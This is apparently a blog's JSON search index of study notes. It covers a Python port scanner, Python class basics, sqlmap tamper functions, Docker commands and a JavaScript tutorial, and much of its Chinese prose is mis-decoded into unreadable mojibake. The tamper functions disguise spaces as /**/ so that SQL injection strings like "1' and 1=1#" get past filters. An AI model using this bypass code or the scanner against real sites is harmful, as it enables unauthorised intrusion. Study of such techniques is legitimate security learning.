in for p in range(port[0],port[1]+1): scan(ip,p)if __name__ == '__main__': try: if len(sys.argv) &lt; 2: print('''[+]You can read the following rules to use this tool.[+]python scanport.py host ports[+]The Default scanports are 21,22,23,80,135,139,443,1433,3306,3389[+]python scanport.py 127.0.0.1 80,90,3306,3389[+]python scanport.py 127.0.0.1 80-90[+]python scanport.py 127.0.0.1 all ''') elif len(sys.argv) == 2: ports(sys.argv[1],port) else: ip = sys.argv[1] if ',' in sys.argv[2]: p = sys.argv[2] p = p.split(',') ports(ip,convert(p)) elif '-' in sys.argv[2]: p = sys.argv[2] p = p.split('-') portsplus(ip,convert(p)) elif sys.argv[2] == 'all': portsplus(ip,allports) else: port = int(sys.argv[2]) scan(ip,port) except: print('''[+]There is something wrong!!! ''') finally: print('''[+]The task has been completed!!! ''') #ç±»å’Œå¯¹è±¡class Person: __age = 18 #ç§æœ‰å±æ€§ name = 'name' def __init__(self,name): self.name = name; def introduce(self): print(\"my name is %s,and my age is %d\"%((self.name),(self.__age))) def __hello(self):#ç§æœ‰æ–¹æ³• print(\"Hello!! My name is %s\"%(self.name))pz1o = Person('pz1o')pz1o.introduce()#å…¬æœ‰æ–¹æ³•è°ƒç”¨print(pz1o._Person__age)#ç§æœ‰å±æ€§è°ƒç”¨pz1o._Person__hello()#ç§æœ‰æ–¹æ³•è°ƒç”¨#tamperç¼–å†™--tamper scan.py#ç»•ç©ºæ ¼def tamper(payload,**kwargs): retVal = payload if payload: retVal = \"\" for x in payload: if x.isspace(): retVal += \"/**/\" else: retVal += x return retValprint(tamper(\"1' and 1=1#\"))#ä¸è¿‡æ»¤å¼•å·é‡Œçš„å†…å®¹def tamper(payload,**kwargs): retVal = payload if payload: retVal = \"\" flag = False for x in payload: if x == \"'\" or x == '\"': flag = not flag retVal += \"'\" elif x.isspace() and not flag: retVal += \"/**/\" else: retVal += x return retValprint(tamper(\"1' my name is pz1o' and 1=1#\"))","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://pz1o.top/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://pz1o.top/tags/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"python","permalink":"https://pz1o.top/tags/python/"}]},{"title":"Dockerå­¦ä¹ ","slug":"Dockerå­¦ä¹ ","date":"2020-08-07T01:01:06.000Z","updated":"2020-11-20T14:18:44.308Z","comments":true,"path":"2020/08/07/Dockerå­¦ä¹ /","link":"","permalink":"https://pz1o.top/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"å‰è¨€ç™½å«–çš„é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸èƒ½æµªè´¹äº†ï¼Œæ¥å­¦ä¹ ä¸€ä¸‹docker,åªè®°å½•ä¸€ä¸‹é‡è¦çš„ã€‚ bç«™å­¦ä¹ èµ„æºhttps://www.bilibili.com/video/BV1og4y1q7M4? DockeråŸºç¡€åŸºæœ¬æ¦‚å¿µ é•œåƒï¼ˆ Image ï¼‰ ï¼šDocker é•œåƒæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿï¼Œé™¤äº†æä¾›å®¹å™¨è¿è¡Œæ—¶æ‰€éœ€çš„ç¨‹åºã€åº“ã€èµ„æºã€é…ç½®ç­‰æ–‡ä»¶å¤–ï¼Œè¿˜åŒ…å«äº†ä¸€äº›ä¸ºè¿è¡Œæ—¶å‡†å¤‡çš„ä¸€äº›é…ç½®å‚æ•°ï¼ˆå¦‚åŒ¿åå·ã€ç¯å¢ƒå˜é‡ã€ç”¨æˆ·ç­‰ï¼‰ã€‚é•œåƒä¸åŒ…å«ä»»ä½•åŠ¨æ€æ•°æ®ï¼Œå…¶å†…å®¹åœ¨æ„å»ºä¹‹åä¹Ÿä¸ä¼šè¢«æ”¹å˜ã€‚ å®¹å™¨ï¼ˆ Container ï¼‰ ï¼šé•œåƒï¼ˆ Image ï¼‰å’Œå®¹å™¨ï¼ˆ Container ï¼‰çš„å…³ç³»ï¼Œå°±åƒæ˜¯é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ä¸­çš„ ç±» å’Œå®ä¾‹ ä¸€æ ·ï¼Œé•œåƒæ˜¯é™æ€çš„å®šä¹‰ï¼Œå®¹å™¨æ˜¯é•œåƒè¿è¡Œæ—¶çš„å®ä½“ã€‚å®¹å™¨å¯ä»¥è¢«åˆ›å»ºã€å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤ã€æš‚åœç­‰ã€‚ ä»“åº“ï¼ˆ Repository ï¼‰ï¼šä¸€ä¸ª Docker Registry ä¸­å¯ä»¥åŒ…å«å¤šä¸ªä»“åº“ï¼ˆ Repository ï¼‰ï¼›æ¯ä¸ªä»“åº“å¯ä»¥åŒ…å«å¤šä¸ªæ ‡ç­¾ï¼ˆ Tag ï¼‰ï¼›æ¯ä¸ªæ ‡ç­¾å¯¹åº”ä¸€ä¸ªé•œåƒã€‚ å®‰è£…12345678910111213141516171819202122232425262728//1.å¸è½½æ—§ç‰ˆæœ¬sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-engine//2.éœ€è¦å®‰è£…å®‰è£…åŒ…yum install -y yum-utils//3.è®¾ç½®é•œåƒä»“åº“yum-config-manager \\ --add-repo \\ http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo//4.æ›´æ–°yumyum makecache fast//5.å®‰è£…dockeryum install docker-ce docker-ce-cli containerd.ioä¸€ç›´y//6.å¯åŠ¨dockersystemctl start docker//7.æµ‹è¯•dockerdocker version docker run hello-world//8.dockeré•œåƒdocker images 1234&#x2F;&#x2F;å¸è½½dockeryum remove docker-ce docker-ce-cli containerd.iorm -rf &#x2F;var&#x2F;lib&#x2F;docker&#x2F;var&#x2F;lib&#x2F;docker docker é»˜è®¤å·¥ä½œè·¯å¾„ runçš„æµç¨‹ Dockerä¸vmä¼ ç»Ÿè™šæ‹ŸæœºæŠ€æœ¯æ˜¯è™šæ‹Ÿå‡ºä¸€å¥—ç¡¬ä»¶åï¼Œåœ¨å…¶ä¸Šè¿è¡Œä¸€ä¸ªå®Œæ•´æ“ä½œç³»ç»Ÿï¼Œåœ¨è¯¥ç³»ç»Ÿä¸Šå†è¿è¡Œæ‰€éœ€åº”ç”¨è¿›ç¨‹ã€‚å®¹å™¨å†…çš„åº”ç”¨è¿›ç¨‹ç›´æ¥è¿è¡Œäºå®¿ä¸»çš„å†…æ ¸ï¼Œå®¹å™¨å†…æ²¡æœ‰è‡ªå·±çš„å†…æ ¸ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰è¿›è¡Œç¡¬ä»¶è™šæ‹Ÿã€‚å› æ­¤å®¹å™¨è¦æ¯”ä¼ ç»Ÿè™šæ‹Ÿæœºæ›´ä¸ºè½»ä¾¿ã€‚ å¸¸ç”¨å‘½ä»¤12docker version &#x2F;&#x2F;ç‰ˆæœ¬ä¿¡æ¯docker info &#x2F;&#x2F;ç³»ç»Ÿä¿¡æ¯ æ–‡æ¡£ï¼šhttps://docs.docker.com/ é•œåƒå‘½ä»¤ 1234567891011docker images -a //åˆ—å‡ºæ‰€æœ‰é•œåƒdokcer images -q //åªæ˜¾ç¤ºid[root@/]# docker imagesREPOSITORY(é•œåƒçš„ä»“åº“æº) TAG(æ ‡ç­¾) IMAGE ID(é•œåƒçš„id) CREATED(åˆ›å»ºæ—¶é—´) SIZE(å¤§å°)hello-world latest bf756fb1ae65 7 months ago 13.3kBdocker search mysql //æœç´¢é•œåƒdokcer pull mysql[:tag] //ä¸‹è½½é•œåƒdocker pull docker.io/library/mysql:latestdocker rmi -f id //åˆ é™¤é•œåƒdocker rmi -f $(docker images -aq) //åˆ é™¤å…¨éƒ¨é•œåƒ å®¹å™¨å‘½ä»¤ ==æœ‰é•œåƒæ‰å¯ä»¥åˆ›å»ºå®¹å™¨ï¼Œå…ˆå®‰è£…ä¸€ä¸ªcentos== 123456789101112131415161718192021222324docker pull centosdocker run [å‚æ•°] image //æ–°å»ºå®¹å™¨å¹¶å¯åŠ¨--name=\"name1\" //å®¹å™¨åå­—-d //åå°è¿è¡Œ-P //éšæœºæŠŠå®¹å™¨çš„ç«¯å£æ˜ å°„åˆ°ä¸€ä¸ªä¸»æœºæœªä½¿ç”¨çš„é«˜ç«¯å£-i //ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œå¸¸ä¸-tè¿ç”¨-t //ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œå¸¸ä¸-iè¿ç”¨-it //äº¤äº’æ–¹å¼è¿è¡Œ-p ipï¼šä¸»æœºç«¯å£ï¼šå®¹å™¨ç«¯å£ //æŒ‡å®šå®¹å™¨ç«¯å£docker ps //æ­£åœ¨è¿è¡Œçš„å®¹å™¨docker ps -a //å†å²è¿è¡Œçš„å®¹å™¨docker rm å®¹å™¨id //åˆ é™¤å®¹å™¨docker rm -f $(docker ps -aq) //åˆ é™¤æ‰€æœ‰å®¹å™¨docker start å®¹å™¨id //å¯åŠ¨å®¹å™¨docker restart å®¹å™¨id //é‡å¯å®¹å™¨docker stop å®¹å™¨id //åœæ­¢å®¹å™¨docker kill å®¹å™¨id //æ€æ­»å®¹å™¨//è¿›å…¥å®¹å™¨docker run -it centos /bin/bash//é€€å‡ºå®¹å™¨exit åœæ­¢é€€å‡ºctrl+p+q ä¸åœæ­¢é€€å‡º ä»githubå¤ç°CTFé¦–å…ˆä»githubä¸Šcloneä¸‹æ¥ 1git clone xxx è‹¥æœ‰docker.ymlç›´æ¥ 1234docker-compose builddocker-compose up -ddocker ps #æŸ¥çœ‹ç«¯å£å· å¦‚æœæœ‰dockerfile 12345è¿›å…¥dockerfileç›®å½•è®¾ç½®æƒé™docker build -t &#39;è‡ªå®šä¹‰é•œåƒåç§°&#39; .(æœ€åæœ‰ä¸€ä¸ªç‚¹)docker run --name&#x3D;&#39;è‡ªå®šä¹‰å®¹å™¨åç§°&#39; -i -d -P é•œåƒåç§° &#x2F;run.shdocker ps &#x2F;&#x2F;æŸ¥çœ‹ç«¯å£å· æŸ¥çœ‹ç«¯å£å· éƒ¨ç½²å®Œæˆ","categories":[{"name":"Docker","slug":"Docker","permalink":"https://pz1o.top/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://pz1o.top/tags/Docker/"}]},{"title":"Javascriptå­¦ä¹ ","slug":"javascriptå­¦ä¹ ","date":"2020-07-09T08:36:24.000Z","updated":"2020-11-20T14:19:03.701Z","comments":true,"path":"2020/07/09/javascriptå­¦ä¹ /","link":"","permalink":"https://pz1o.top/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Javascriptå‚è€ƒå»–é›ªå³°æ•™ç¨‹https://www.liaoxuefeng.com/wiki/1022910821149312 å…¥é—¨javascriptå¼•å…¥javascriptå†…éƒ¨æ ‡ç­¾ 1234&lt;script&gt; /... ..&lt;/script&gt; å¤–éƒ¨å¼•å…¥ 1&lt;script src=\"./..\"&gt;&lt;/script&gt; åŸºæœ¬è¯­æ³•123456789// å˜é‡var num = 1;// æ¡ä»¶æ§åˆ¶if()&#123;..&#125;else&#123;..&#125;//console.log(num) æ•°æ®ç±»å‹å˜é‡ å˜é‡åæ˜¯å¤§å°å†™è‹±æ–‡ã€æ•°å­—ã€$å’Œ_çš„ç»„åˆï¼Œä¸”ä¸èƒ½ç”¨æ•°å­—å¼€å¤´ 1var $1 = \"a\"; æ•°å­— 123456123 //æ•´æ•°123.1 //æµ®ç‚¹æ•°1.1e1 //ç§‘å­¦è®¡æ•°æ³•NaN //not a number'abc' //å­—ç¬¦ä¸²true //å¸ƒå°”å€¼ æ¯”è¾ƒè¿ç®—ç¬¦ 123=== ç­‰äºï¼ˆç±»å‹ä¸ä¸€æ ·ï¼Œå€¼ä¸€æ ·ï¼‰=== ç»å¯¹ç­‰äºï¼ˆç±»å‹ä¸€æ ·ï¼Œå€¼ä¸€æ ·ï¼‰ NaN===NaNæ˜¯falseï¼Œå®ƒä¸ä»»ä½•å€¼éƒ½ä¸ç›¸ç­‰ï¼ŒåŒ…æ‹¬è‡ªå·±ã€‚ isNaNï¼ˆNaNï¼‰ä¼šè¿”å›trueã€‚ æ•°ç»„ ä¸­æ‹¬å· 1var arr = [1,2,3,\"hello\"] å¯¹è±¡ å¤§æ‹¬å·,æ¯ä¸ªå±æ€§ç”¨é€—å·éš”å¼€ï¼Œæœ€åä¸éœ€è¦ 123456789var person = &#123; name: \"111\", age: 3&#125;person.name&gt;111person.age&gt;3 strictæ¨¡å¼åœ¨åŒä¸€ä¸ªé¡µé¢çš„ä¸åŒçš„JavaScriptæ–‡ä»¶ä¸­ï¼Œå¦‚æœéƒ½ä¸ç”¨varç”³æ˜ï¼Œæ°å¥½éƒ½ä½¿ç”¨äº†å˜é‡iï¼Œå°†é€ æˆå˜é‡iäº’ç›¸å½±å“ï¼Œäº§ç”Ÿéš¾ä»¥è°ƒè¯•çš„é”™è¯¯ç»“æœã€‚ ä½¿ç”¨varç”³æ˜çš„å˜é‡åˆ™ä¸æ˜¯å…¨å±€å˜é‡ï¼Œå®ƒçš„èŒƒå›´è¢«é™åˆ¶åœ¨è¯¥å˜é‡è¢«ç”³æ˜çš„å‡½æ•°ä½“å†…ï¼ˆå‡½æ•°çš„æ¦‚å¿µå°†ç¨åè®²è§£ï¼‰ï¼ŒåŒåå˜é‡åœ¨ä¸åŒçš„å‡½æ•°ä½“å†…äº’ä¸å†²çªã€‚ ä¸ºäº†ä¿®è¡¥JavaScriptè¿™ä¸€ä¸¥é‡è®¾è®¡ç¼ºé™·ï¼ŒECMAåœ¨åç»­è§„èŒƒä¸­æ¨å‡ºäº†strictæ¨¡å¼ï¼Œåœ¨strictæ¨¡å¼ä¸‹è¿è¡Œçš„JavaScriptä»£ç ï¼Œå¼ºåˆ¶é€šè¿‡varç”³æ˜å˜é‡ï¼Œæœªä½¿ç”¨varç”³æ˜å˜é‡å°±ä½¿ç”¨çš„ï¼Œå°†å¯¼è‡´è¿è¡Œé”™è¯¯ã€‚ 1234'use strict';abc = \"\"hello world\";//ä½¿ç”¨strictæ¨¡å¼ä¸Šé¢ä»£ç ä¼šæŠ¥é”™var abc = \"hello world\"; å­—ç¬¦ä¸²12345//è½¬ä¹‰å­—ç¬¦\\n\\t'\\x41'; // å®Œå…¨ç­‰åŒäº 'A''\\u4e2d\\u6587'; // å®Œå…¨ç­‰åŒäº 'ä¸­æ–‡' å¤šè¡Œå­—ç¬¦ä¸²ç”±äºå¤šè¡Œå­—ç¬¦ä¸²ç”¨\\nå†™èµ·æ¥æ¯”è¾ƒè´¹äº‹ï¼Œæ‰€ä»¥æœ€æ–°çš„ES6æ ‡å‡†æ–°å¢äº†ä¸€ç§å¤šè¡Œå­—ç¬¦ä¸²çš„è¡¨ç¤ºæ–¹æ³•ï¼Œç”¨åå¼•å· ``è¡¨ç¤º æ¨¡æ¿å­—ç¬¦ä¸²è¦æŠŠå¤šä¸ªå­—ç¬¦ä¸²è¿æ¥èµ·æ¥,å¯ä»¥ç”¨+ä¹Ÿå¯ä»¥ç”¨`${..}è¡¨ç¤º 123456//+å·var name = \"xiao\";console.log(123+name);//$&#123;&#125;var name = \"xiao\";console.log(`123$&#123;name&#125;`) æ“ä½œå­—ç¬¦ä¸² å­—ç¬¦ä¸²æ˜¯ä¸å¯æ”¹å˜çš„ï¼Œæ— è®ºä¹‹åèµ‹å€¼ï¼Œéƒ½ä¸ä¼šæ”¹å˜ã€‚ 123var s = \"a\";console.log(s.length); //é•¿åº¦console.log(s[0]); //è¾“å‡º æ•°ç»„JavaScriptçš„Arrayå¯ä»¥åŒ…å«ä»»æ„æ•°æ®ç±»å‹ï¼Œå¹¶é€šè¿‡ç´¢å¼•æ¥è®¿é—®æ¯ä¸ªå…ƒç´ ã€‚ 123var arr = [1,2,3];arr.length;arr.length = 6; //å¯ä»¥é€šè¿‡ç»™lengthèµ‹å€¼ï¼Œæ”¹å˜æ•°ç»„çš„å¤§å° å¯¹è±¡JavaScriptçš„å¯¹è±¡æ˜¯ä¸€ç§æ— åºçš„é›†åˆæ•°æ®ç±»å‹ï¼Œå®ƒç”±è‹¥å¹²é”®å€¼å¯¹ç»„æˆã€‚ 123456789var xiao=&#123; name: 'xiao', age: 18, 'school': 'No.1'&#125;console.log(xiao.name)console.log(xiao['name']) //ä¸¤ç§éƒ½å¯ä»¥è®¿é—®xiaoçš„nameå€¼console.log(xiao['school']) ç”±äºJavaScriptçš„å¯¹è±¡æ˜¯åŠ¨æ€ç±»å‹ï¼Œä½ å¯ä»¥è‡ªç”±åœ°ç»™ä¸€ä¸ªå¯¹è±¡æ·»åŠ æˆ–åˆ é™¤å±æ€§. 12345678910var xiao=&#123; name: 'xiao',&#125;xiao.age=18;alert(xiao.age);delete xiao.age//å¯ä»¥ç”¨hasOwnProperty()æ–¹æ³•æ¥åˆ¤æ–­å±æ€§æ˜¯å¦æ˜¯è‡ªèº«æ‹¥æœ‰çš„xiao.hasOwnProperty('name') //truexiao.hasOwnProperty('age') //false æ¡ä»¶åˆ¤æ–­1234567891011121314&#x2F;&#x2F;å•ä¸ªåˆ¤æ–­if(...)&#123; ...&#125;else&#123; ...&#125;&#x2F;&#x2F;å¤šè¡Œæ¡ä»¶åˆ¤æ–­ if()&#123;..&#125;else if()&#123;..&#125;else&#123;&#125; JavaScriptæŠŠnullã€undefinedã€0ã€NaNå’Œç©ºå­—ç¬¦ä¸²&#39;&#39;è§†ä¸ºfalseï¼Œå…¶ä»–å€¼ä¸€æ¦‚è§†ä¸ºtrue. å¾ªç¯123for(;;)&#123; ...;&#125; forå¾ªç¯æœ€å¸¸ç”¨çš„åœ°æ–¹å°±æ˜¯éå†æ•°ç»„ 123456var arr = [1,2,3];var i;for(i=0;i&lt;3;i++)&#123; console.log(arr[i]);&#125;//1 2 3 for in12345678910111213141516var o = &#123; name: 'bob', age: 18&#125;;for(var key in o)&#123; console.log(key); console.log(o[key]);&#125;//name age//bob 18//åŒæ ·ï¼Œæ•°ç»„ä¸­ä¹Ÿå¯ä»¥ç”¨for...invar a = ['A','B','C'];for(var i in a)&#123; console.log(a[i]);&#125;//A B C while 123while(...)&#123; ...;&#125; doâ€¦while 123do&#123; ...&#125;while(...) Mapå’ŒSetJavaScriptçš„é»˜è®¤å¯¹è±¡è¡¨ç¤ºæ–¹å¼{}å¯ä»¥è§†ä¸ºå…¶ä»–è¯­è¨€ä¸­çš„Mapæˆ–Dictionaryçš„æ•°æ®ç»“æ„ï¼Œå³ä¸€ç»„é”®å€¼å¯¹ã€‚ ä½†æ˜¯JavaScriptçš„å¯¹è±¡æœ‰ä¸ªå°é—®é¢˜ï¼Œå°±æ˜¯é”®å¿…é¡»æ˜¯å­—ç¬¦ä¸²ã€‚ä½†å®é™…ä¸ŠNumberæˆ–è€…å…¶ä»–æ•°æ®ç±»å‹ä½œä¸ºé”®ä¹Ÿæ˜¯éå¸¸åˆç†çš„ã€‚ MapMapæ˜¯ä¸€ç»„é”®å€¼å¯¹çš„ç»“æ„ï¼Œå…·æœ‰æå¿«çš„æŸ¥æ‰¾é€Ÿåº¦ã€‚ åˆå§‹åŒ–Mapéœ€è¦ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œæˆ–è€…ç›´æ¥åˆå§‹åŒ–ä¸€ä¸ªç©ºMapã€‚ 12345678910//Mapåˆå§‹åŒ–var m = new Map();//å¢m.set('Bob',100);m.set('Pz1o',99);//åˆ m.delete('Bob');//æŸ¥m.has('Pz1o'); //truem.get('Pz1o'); //99 æ³¨æ„ï¼šä¸€ä¸ªkeyåªèƒ½å¯¹åº”ä¸€ä¸ªvalueï¼Œé‡å¤å®šä¹‰åé¢çš„å€¼ä¼šè¦†ç›–æ‰å‰é¢çš„å€¼ã€‚ SetSetå’ŒMapç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä¸€ç»„keyçš„é›†åˆï¼Œä½†ä¸å­˜å‚¨valueã€‚ç”±äºkeyä¸èƒ½é‡å¤ï¼Œæ‰€ä»¥ï¼Œåœ¨Setä¸­ï¼Œæ²¡æœ‰é‡å¤çš„keyã€‚ 12345678910//setåˆå§‹åŒ–var s = new Set([1,2,3]);//é‡å¤å…ƒç´ ä¼šè¢«è‡ªåŠ¨è¿‡æ»¤var s = new Set([1,2,3,3]);//å¢s.add(4);//åˆ s,delete(3);//æŸ¥s; iterableéå†Arrayå¯ä»¥é‡‡ç”¨ä¸‹æ ‡å¾ªç¯ï¼Œéå†Mapå’ŒSetå°±æ— æ³•ä½¿ç”¨ä¸‹æ ‡ã€‚ä¸ºäº†ç»Ÿä¸€é›†åˆç±»å‹ï¼ŒES6æ ‡å‡†å¼•å…¥äº†æ–°çš„iterableç±»å‹ï¼ŒArrayã€Mapå’ŒSetéƒ½å±äº**iterableç±»å‹ã€‚** å…·æœ‰iterableç±»å‹çš„é›†åˆå¯ä»¥é€šè¿‡æ–°çš„for ... ofå¾ªç¯æ¥éå†ã€‚ 123456789101112131415var a = [1,2,3];var s = new Set([1,2,3]);var m = new Map([['A','a'],['Y','y']]);for(var i of a)&#123; console.log(i);&#125;//1 2 3for(var i of s)&#123; console.log(i);&#125;//1 2 3for(var i of m)&#123; console.log(i);&#125;//[\"A\",\"a\"] [\"Y\",\"y\"] for...inå’Œfor...ofçš„ä¸åŒç‚¹ï¼š for...inä¼šéå†å¯¹è±¡çš„æ‰€æœ‰å±æ€§åç§°ï¼Œä¸€ä¸ªArrayæ•°ç»„å®é™…ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒçš„æ¯ä¸ªå…ƒç´ çš„ç´¢å¼•è¢«è§†ä¸ºä¸€ä¸ªå±æ€§ã€‚ for...ofåˆ™ä¿®å¤äº†è¿™äº›é—®é¢˜ï¼Œå®ƒåªéå†å¾ªç¯é›†åˆçš„æœ¬èº«å…ƒç´ ã€‚ 1234567&#x2F;&#x2F;forEachå‡½æ•°åŒæ ·å¯ä»¥ç”¨æ¥éå†var a &#x3D; [&#39;A&#39;,&#39;B&#39;,&#39;C&#39;];a.forEach(function(value,index,a)&#123; console.log(value+&#39;,&#39;+index);&#125;);&#x2F;&#x2F;A,0 B,1 C,2forEach(å€¼,é”®,è‡ªèº«) å‡½æ•°å‡½æ•°å®šä¹‰å’Œè°ƒç”¨å®šä¹‰å‡½æ•° 1234567891011121314function abs(...)&#123; ... ...&#125;//function æŒ‡æ˜æ˜¯å‡½æ•°çš„å®šä¹‰//absæ˜¯å‡½æ•°åç§°//(...)é‡Œé¢æ˜¯å‚æ•°//&#123;...&#125;æ˜¯å‡½æ•°ä½“//å¦ä¸€ç§å®šä¹‰æ–¹æ³•var abs = function(..)&#123; ...&#125;;//åœ¨è¿™ç§æ–¹å¼ä¸‹ï¼Œfunction(x)&#123; ... &#125;æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œå®ƒæ²¡æœ‰å‡½æ•°åã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªåŒ¿åå‡½æ•°èµ‹å€¼ç»™äº†å˜é‡absï¼Œæ‰€ä»¥ï¼Œé€šè¿‡å˜é‡abså°±å¯ä»¥è°ƒç”¨è¯¥å‡½æ•°ã€‚ è¯·æ³¨æ„ï¼Œå‡½æ•°ä½“å†…éƒ¨çš„è¯­å¥åœ¨æ‰§è¡Œæ—¶ï¼Œä¸€æ—¦æ‰§è¡Œåˆ°returnæ—¶ï¼Œå‡½æ•°å°±æ‰§è¡Œå®Œæ¯•ï¼Œå¹¶å°†ç»“æœè¿”å›ã€‚å› æ­¤ï¼Œå‡½æ•°å†…éƒ¨é€šè¿‡æ¡ä»¶åˆ¤æ–­å’Œå¾ªç¯å¯ä»¥å®ç°éå¸¸å¤æ‚çš„é€»è¾‘ã€‚ å¦‚æœæ²¡æœ‰returnè¯­å¥ï¼Œå‡½æ•°æ‰§è¡Œå®Œæ¯•åä¹Ÿä¼šè¿”å›ç»“æœï¼Œåªæ˜¯ç»“æœä¸ºundefinedã€‚ è°ƒç”¨å‡½æ•° 123abs(10);abs(10,111); &#x2F;&#x2F;è¿”å›10abs(); &#x2F;&#x2F;è¿”å›NaN ç”±äºJavaScriptå…è®¸ä¼ å…¥ä»»æ„ä¸ªå‚æ•°è€Œä¸å½±å“è°ƒç”¨ï¼Œå› æ­¤ä¼ å…¥çš„å‚æ•°æ¯”å®šä¹‰çš„å‚æ•°å¤šä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚ arguments 1234//arguments(ä¼ªæ•°ç»„)//å­˜å‚¨äº†ç”¨æˆ·çš„æ‰€æœ‰å®å‚//ä¼ªæ•°ç»„ æœ‰lengthå±æ€§ æ˜¯æŒ‰ç…§ç´¢å¼•å­˜å‚¨çš„fn(1,2,3) //argumentsçš„æ•°ç»„å°±æ˜¯1 2 3 å®é™…ä¸Šargumentsæœ€å¸¸ç”¨äºåˆ¤æ–­ä¼ å…¥å‚æ•°çš„ä¸ªæ•°,ä»¥æ­¤æ¥åˆ¤æ–­ç¼ºå¤±å‚æ•°ã€‚ rest ç”±äºjsä¸­ä¼šæ¥å—æ¥å—å¤šä½™çš„å‚æ•°ï¼Œæ‰€ä»¥ç”¨ä¸€ä¸ªrestæ•°ç»„æ¥è¡¨ç¤ºå¤šä½™çš„å‚æ•°ã€‚restå‚æ•°åªèƒ½å†™åœ¨æœ€åï¼Œå‰é¢ç”¨...æ ‡è¯†ã€‚ 123456function fn(a,b,...rest)&#123;console.log(rest);return a+b;&#125;fn(1,2,3); //[3]fn(1,2) //[] å˜é‡ä½œç”¨åŸŸä¸è§£æ„èµ‹å€¼å¦‚æœä¸€ä¸ªå˜é‡åœ¨å‡½æ•°ä½“å†…éƒ¨ç”³æ˜ï¼Œåˆ™è¯¥å˜é‡çš„ä½œç”¨åŸŸä¸ºæ•´ä¸ªå‡½æ•°ä½“ï¼Œåœ¨å‡½æ•°ä½“å¤–ä¸å¯å¼•ç”¨è¯¥å˜é‡ã€‚ å¦‚æœä¸¤ä¸ªä¸åŒçš„å‡½æ•°å„è‡ªç”³æ˜äº†åŒä¸€ä¸ªå˜é‡ï¼Œé‚£ä¹ˆè¯¥å˜é‡åªåœ¨å„è‡ªçš„å‡½æ•°ä½“å†…èµ·ä½œç”¨ã€‚æ¢å¥è¯è¯´ï¼Œä¸åŒå‡½æ•°å†…éƒ¨çš„åŒåå˜é‡äº’ç›¸ç‹¬ç«‹ï¼Œäº’ä¸å½±å“ã€‚ å…¨å±€ä½œç”¨åŸŸ ä¸åœ¨ä»»ä½•å‡½æ•°å†…å®šä¹‰çš„å˜é‡å°±å…·æœ‰å…¨å±€ä½œç”¨åŸŸã€‚å®é™…ä¸Šï¼ŒJavaScripté»˜è®¤æœ‰ä¸€ä¸ªå…¨å±€å¯¹è±¡windowï¼Œå…¨å±€ä½œç”¨åŸŸçš„å˜é‡å®é™…ä¸Šè¢«ç»‘å®šåˆ°windowçš„ä¸€ä¸ªå±æ€§ã€‚ 123var a = 'A';console.log(a);console.log(window.a); åŒæ ·çš„ï¼Œå‡½æ•°ä¹Ÿæ˜¯ä¸€ä¸ªå˜é‡ï¼Œä¹Ÿä¼šç»‘å®šåˆ°windowså¯¹è±¡ã€‚ä»»ä½•å˜é‡ï¼ˆå‡½æ•°ä¹Ÿè§†ä¸ºå˜é‡ï¼‰ï¼Œå¦‚æœæ²¡æœ‰åœ¨å½“å‰å‡½æ•°ä½œç”¨åŸŸä¸­æ‰¾åˆ°ï¼Œå°±ä¼šç»§ç»­å¾€ä¸ŠæŸ¥æ‰¾ï¼Œæœ€åå¦‚æœåœ¨å…¨å±€ä½œç”¨åŸŸä¸­ä¹Ÿæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™æŠ¥ReferenceErroré”™è¯¯ã€‚ åå­—ç©ºé—´ å…¨å±€å˜é‡ä¼šç»‘å®šåˆ°windowä¸Šï¼Œä¸åŒçš„JavaScriptæ–‡ä»¶å¦‚æœä½¿ç”¨äº†ç›¸åŒçš„å…¨å±€å˜é‡ï¼Œæˆ–è€…å®šä¹‰äº†ç›¸åŒåå­—çš„é¡¶å±‚å‡½æ•°ï¼Œéƒ½ä¼šé€ æˆå‘½åå†²çªï¼Œå¹¶ä¸”å¾ˆéš¾è¢«å‘ç°ã€‚å‡å°‘å†²çªçš„ä¸€ä¸ªæ–¹æ³•æ˜¯æŠŠè‡ªå·±çš„æ‰€æœ‰å˜é‡å’Œå‡½æ•°å…¨éƒ¨ç»‘å®šåˆ°ä¸€ä¸ªå…¨å±€å˜é‡ä¸­ã€‚ 12345var Ma = 0;Ma.name = \"xiaoming\";Ma.fn = function()&#123; ....&#125;; å±€éƒ¨ä½œç”¨åŸŸ ä¸ºäº†è§£å†³å—çº§ä½œç”¨åŸŸï¼ŒES6å¼•å…¥äº†æ–°çš„å…³é”®å­—letï¼Œç”¨letæ›¿ä»£varå¯ä»¥ç”³æ˜ä¸€ä¸ªå—çº§ä½œç”¨åŸŸçš„å˜é‡ã€‚ å¸¸é‡ ES6æ ‡å‡†å¼•å…¥äº†æ–°çš„å…³é”®å­—constæ¥å®šä¹‰å¸¸é‡ï¼Œconstä¸letéƒ½å…·æœ‰å—çº§ä½œç”¨åŸŸã€‚ è§£æ„èµ‹å€¼ è§£æ„èµ‹å€¼å°±æ˜¯åŒæ—¶å¯¹ä¸€ç»„å˜é‡è¿›è¡Œèµ‹å€¼ã€‚ 12var [x, y, z] = ['hello', 'JavaScript', 'ES6'];console.log(x); 